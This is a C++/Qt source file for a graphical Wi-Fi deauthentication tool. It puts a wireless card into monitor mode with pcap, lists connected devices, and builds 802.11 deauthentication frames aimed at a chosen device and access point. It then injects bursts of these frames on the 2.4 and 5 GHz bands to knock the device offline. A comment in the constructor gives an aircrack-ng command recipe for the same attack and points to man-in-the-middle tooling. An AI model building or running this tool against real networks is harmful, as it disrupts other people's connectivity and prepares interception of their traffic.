#include <QScrollBar>
#include <QStringBuilder>
#include <QTimer>


/* NetworkManager Include files */
#include <NetworkManagerQt/ConnectionSettings>
#include <NetworkManagerQt/Manager>
#include <NetworkManagerQt/Settings>

#include "deauther.h"
#include "deauther_p.h"
#include "ui_deauther.h"

#include "pcap.h"
#include "network_model.h"


Deauther::Deauther(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Deauther),
    search_animation_timer (new QTimer (this)),
    stylesheets (new CustomStyleSheets)
{
    ui->setupUi(this);

    setup_network_list();
    setup_station_view();

    iface_model = new IfaceModel();

    // create drop down list for network interfaces
    ui->iface_list->setModel(iface_model);


    // set up toggle for monitor mode (creates a pcap handle)
    ui->monitor_status->
        setIcon(QIcon(":/icons/actions/24/edit-find-replace_inactive.svg"));
    ui->monitor_status->setIconSize(QSize(50, 50));

    connect(ui->toggle_monitoring, &QPushButton::clicked,
            this, &Deauther::toggle_monitoring);

    // set up packet search icon
    search_animation_timer->setInterval (1000);
    connect (search_animation_timer, &QTimer::timeout,
             this, [&]() {search_animation(ui->monitor_status);});

    connect(ui->deauth_attack, &QPushButton::clicked,
            this, &Deauther::deauther_attack);


    /* Pseudo Code for Deathor */

    // Connect to network

    // Set wireless device in monitoring mode (may need root)
        // sudo airmon-ng start <network device name>

    // Update network device name (will have mon in name)
        // iwconfig

    // Select Router BSSID and channel
        // sudo airodump-ng <network device name>
        // sudo airodump-ng wlp5s0mon --band a (5G search)

    // Find the device we want to kick
        // sudo airodump-ng <network device name> --bssid <router id> --channel <router channel>
        // --manufacturer

        // apply patch at https://github.com/aircrack-ng/aircrack-ng/pull/2167/files
        // to see manufacturer based on mac address

        // will not work if devices mac address is randomized
    // Deauthenticate device
        // aireplay-ng --deauth 0 -c <device mac address> -a <router mac address> <network device name>

    // For man-in-the-middle
        // look at airbase-ng
        // https://aircrack-ng.net/doku.php?id=airbase-ng
}

/* Constructor for private functions */
Deauther::Deauther (DeautherPrivate &dd)
    : d_ptr (&dd)
{
}

Deauther::~Deauther()
{
    delete ui;
}


void Deauther::setup_network_list (void)
{
    QVector<ItemRole> roles ({ItemRole::NameRole});

    network_model = new NetworkModel (roles);
    network_model->setWirelessProperties (WirelessProperties::RemoveUnavailableNetworks, true);
    network_model->start_scan();

    network_sort = new NetworkSort();
    network_sort->setSourceModel (network_model);

    ui->network_list->setModel (network_sort);
    ui->network_list->model()->sort(0, Qt::AscendingOrder);
}


void Deauther::setup_station_view (void)
{
    QVector<StationItemRole> roles ({StationItemRole::StationRole,
                                     StationItemRole::AccessPointRole});

    station_model = new StationModel(roles);

    ui->station_view->setModel(station_model);

    ui->station_view->resizeColumnToContents (network_model->columnCount()-1);
    ui->station_view->setIndentation (10);
    //ui->station_view->setIconSize (QSize (36,36));
    ui->station_view->setColumnWidth (0, 180);

    // Set treeview header font
    ui->station_view->header()->setFont(QFont("LiberationSans", 18, QFont::Bold));

    // Set treeview header size for scrollbar gutter
    treeview_stylesheet = stylesheets->
                          treeview_scrollbar
                          (
                              ui->station_view->header()->
                              sizeHint().height()
                          );

    // Set treeview scrollbar colors
    ui->station_view->setStyleSheet (treeview_stylesheet
                                     % stylesheets->vertical_scrollbar_quirk());

    // install filter to correct horizontal scrollbar quirks
    ui->station_view->horizontalScrollBar()->installEventFilter(this);
}


void Deauther::toggle_monitoring ()
{
    static bool monitoring = true;

    const QIcon search_inactive = QIcon (":/icons/actions/24/edit-find-replace_inactive.svg");
    const QIcon search_active = QIcon (":/icons/actions/24/edit-find-replace_state0.svg");

    // create a pcap handle using the selected network interface
    QByteArray iface = ui->iface_list->currentText().toUtf8();
    QByteArray error_buffer[PCAP_ERRBUF_SIZE];

    if (monitoring)
    {
        iface_handle = pcap_create(iface.data(), error_buffer->data());

        if (iface_handle == NULL)
        {
            qWarning() << "Warning: pcap_create failed with" << error_buffer->data();
            qWarning() << Qt::endl;
            return;
        }

        // check if iface supports monitoring
        if (!pcap_can_set_rfmon (iface_handle))
        {
            qInfo() << "Info: monitor mode is not supported for" << iface.data();
            qInfo() << Qt::endl;
            pcap_close (iface_handle);
            return;
        }

        // set handle to monitor mode
        if (pcap_set_rfmon (iface_handle, 1))
        {
            qWarning() << "Warning: setting" << iface.data() << "to monitor mode failed";
            qWarning() << Qt::endl;
            pcap_close (iface_handle);
            return;
        }

        // avoid blocking pcap thread
        pcap_set_immediate_mode(iface_handle, 1);
        pcap_set_timeout(iface_handle, 500);
        pcap_setdirection(iface_handle, PCAP_D_INOUT);

        // activate new monitor iface
        if (pcap_activate (iface_handle))
        {
            qWarning() << "Warning: Creating monitoring interface for"
                       << iface.data() << "failed" << Qt::endl
                       << "Do you have permissions?" << Qt::endl;
            pcap_close (iface_handle);
            return;
        }

        station_model->start_pcapThread (iface_handle);

        ui->iface_list->setEnabled(false);

        // start packet search icon
        search_animation_timer->start();
        ui->monitor_status->setIcon (search_active);
        search_animation_state = 1;
    }
    else
    {
        station_model->stop_pcapThread ();

        ui->iface_list->setEnabled(true);

        pcap_close (iface_handle);

        // stop packet search icon
        search_animation_timer->stop();
        ui->monitor_status->setIcon (search_inactive);
    }

    // toggle monitoring mode
    monitoring ^= 1;

}


void Deauther::search_animation (QPushButton *button)
{
    switch (search_animation_state) {
    case 1:
        button->setIcon (QIcon (":/icons/actions/24/edit-find-replace_state1.svg"));
        break;
    case 2:
        button->setIcon (QIcon (":/icons/actions/24/edit-find-replace_state2.svg"));
        break;
    case 3:
        button->setIcon (QIcon (":/icons/actions/24/edit-find-replace_state3.svg"));
        break;
    default:
        search_animation_state = 1;
        break;
    }
    ++search_animation_state;


    if (search_animation_state > 3)
    {
        search_animation_state = 1;
    }
}


void Deauther::deauther_attack ()
{
    static bool attack_active = false;

    static QTimer pcap_send_t1;
    pcap_send_t1.setInterval (1000);

    static QTimer pcap_send_t2;
    pcap_send_t2.setInterval (900);

    /* Find current row of station view */
    QModelIndex index = ui->station_view->currentIndex();

    if (index.row() == -1
        && !attack_active)
    {
        return;
    }


    /* Retrieve selected station */
    if (!station_mutex.tryLock())
    {
        return;
    }

    StationItem *station_item = static_cast<StationItem*>(index.internalPointer());

    QByteArray stmac = station_item->stmac();
    ap_info ap = station_item->apInfo();

    station_mutex.unlock();


    /* find ap address */
    bool ap_found = false;

    QByteArray bssid_2;
    int chan_2;
    if (!ap.bssid[0].isNull())
    {
        bssid_2 = ap.bssid[0];

        ap_found = true;
    }

    QByteArray bssid_5;
    int chan_5;
    if (!ap.bssid[1].isNull())
    {
        bssid_5 = ap.bssid[1];

        ap_found = true;
    }

    if(!ap_found)
    {
        return;
    }


    /* create deauth packet */

    // 2GHz deauth packet
    QByteArray packet_2 = QByteArray::fromRawData
            (reinterpret_cast<const char*>(radiotap_h), 13);

    packet_2.append(reinterpret_cast<const char*>(deauth_packet), 26);

    packet_2.replace(17, 6, bssid_2);
    packet_2.replace(23, 6, stmac);
    packet_2.replace(29, 6, bssid_2);


    // 5GHz deauth packet
    QByteArray packet_5 = QByteArray::fromRawData
            (reinterpret_cast<const char*>(radiotap_h), 13);

    packet_5.append(reinterpret_cast<const char*>(deauth_packet), 26);

    packet_5.replace(17, 6, bssid_5);
    packet_5.replace(23, 6, stmac);
    packet_5.replace(29, 6, bssid_5);


    QDebug print_pk = qDebug();

    int len = 8;
    int rem = 0;
    QString ascii;
    ascii.resize(len);
    ascii.fill('.');
    for (int i=0; i<packet_2.size(); ++i)
    {
        if (!(i%len))
        {
            QString pos = QString("%1").arg(i, 6, 16, QLatin1Char( '0' ));
            print_pk << pos.toUtf8().data();

            (packet_2.size() < i+len) ? rem = packet_2.size()-i : rem = len;
            print_pk << packet_2.sliced(i,rem).toHex(' ').data();
        }

        if (packet_2.at(i)  > 0x20)
        {
            ascii[i%len] = packet_2[i];
        }

        if (!(((i+1)%len)))
        {
            QString align;
            align.resize (4*(len-rem)-1);
            align.fill (' ');
            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;

            ascii.fill('.');
        }
        else if (i == packet_2.size() - 1)
        {
            QString align;
            align.resize (4*(len-rem)-1);
            align.fill (' ');
            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;
        }
    }

    print_pk << Qt::endl;



    const uchar* pk_data = reinterpret_cast<const uchar*>(packet_2.data());
    // confirm results of conversion from qbytearray to uchar*
    len = 8;
    rem = 0;
    ascii.resize(len);
    ascii.fill('.');
    for (int i=0; i<packet_2.size(); ++i)
    {
        if (!(i%len))
        {
            QString pos = QString("%1").arg(i, 6, 16, QLatin1Char( '0' ));
            print_pk << pos.toUtf8().data();

            (packet_2.size() < i+len) ? rem = packet_2.size()-i : rem = len;
            //print_pk << packet_2.sliced(i,rem).toHex(' ').data();
        }

        QString byte = QString("%1").arg(quint8(pk_data[i]), 2, 16, QLatin1Char( '0' ));
        print_pk << byte.toUtf8().data();

        if (packet_2.at(i)  > 0x20)
        {
            ascii[i%len] = packet_2[i];
        }

        if (!(((i+1)%len)))
        {

            QString align;
            align.resize (4*(len-rem)-1);
            align.fill (' ');
            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;

            ascii.fill('.');
        }
        else if (i == packet_2.size() - 1)
        {
            QString align;
            align.resize (4*(len-rem)-1);
            align.fill (' ');
            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;
        }
    }


    /* send deauth packet */
    int i = 0;
    if (!attack_active)
    {
        qDebug() << "Start Deauth Attack";
        qDebug() << Qt::endl;
        station_model->stop_pcapThread ();
        ui->toggle_monitoring->setEnabled(false);


        if (!bssid_2.isNull())
        {
            //int fd_handle = pcap_fileno(iface_handle);
            connect (&pcap_send_t1, &QTimer::timeout, this, [&, packet_2]
            {
                const uchar* pk_data = reinterpret_cast<const uchar*>(packet_2.data());
                bool sent_packet = false;

                station_mutex.lock();
                for (int i=0; i<64; ++i)
                {
                    if(pcap_inject (this->iface_handle, pk_data, 39) == 0)
                    {
                        sent_packet = true;
                    }
                }

                if (!sent_packet)
                {
                    qWarning() << "Warning: failed to send 2GHz deauth packet";
                    qWarning() << Qt::endl;
                }
                //else { qDebug() << "Packet sent 2GHz" << Qt::endl; }
                station_mutex.unlock();

                //qDebug() << "sent" << i;
                //++i;
            });

            pcap_send_t1.start();
            attack_active = true;;
        }

        if (!bssid_5.isNull())
        {
            connect (&pcap_send_t2, &QTimer::timeout, this, [&, packet_5]
            {
                    const uchar* pk_data = reinterpret_cast<const uchar*>(packet_5.data());
                    bool sent_packet = false;

                    station_mutex.lock();
                    for (int i=0; i<64; ++i)
                    {
                        if(pcap_inject (this->iface_handle, pk_data, 39) == 0)
                        {
                            sent_packet = true;
                        }
                    }

                    if (!sent_packet)
                    {
                        qWarning() << "Warning: failed to send 5GHz deauth packet";
                        qWarning() << Qt::endl;
                    }
                    //else { qDebug() << "Packet sent 2GHz" << Qt::endl; }
                    station_mutex.unlock();
            });

            pcap_send_t2.start();
            attack_active = true;
        }
    }
    else
    {
        qDebug() << "deauth off deactivate";
        pcap_send_t1.stop();
        pcap_send_t2.stop();

        disconnect (&pcap_send_t1);
        disconnect (&pcap_send_t2);

        station_model->start_pcapThread(iface_handle);
        ui->toggle_monitoring->setEnabled(true);

        attack_active = false;
    }
}


/* Filter to fix vertical scrollbar border when horizontal scrollbar appears
**
** Add bottom border to vertical scrollbar, on horizontal scrollbar hide
**
** Remove bottom border to vertical scrollbar on horizontal scrollbar appear
**/
bool Deauther::eventFilter(QObject *object, QEvent *event)
{
    if (event->type() == QEvent::Hide)
    {
        QString update_scrollbar;

        update_scrollbar =
                treeview_stylesheet
                % stylesheets->vertical_scrollbar_quirk();

        ui->station_view->setStyleSheet (update_scrollbar);
    }
    else if (event->type() == QEvent::Show)
    {
        ui->station_view->setStyleSheet (treeview_stylesheet);
    }

    return QWidget::eventFilter (object, event);
}
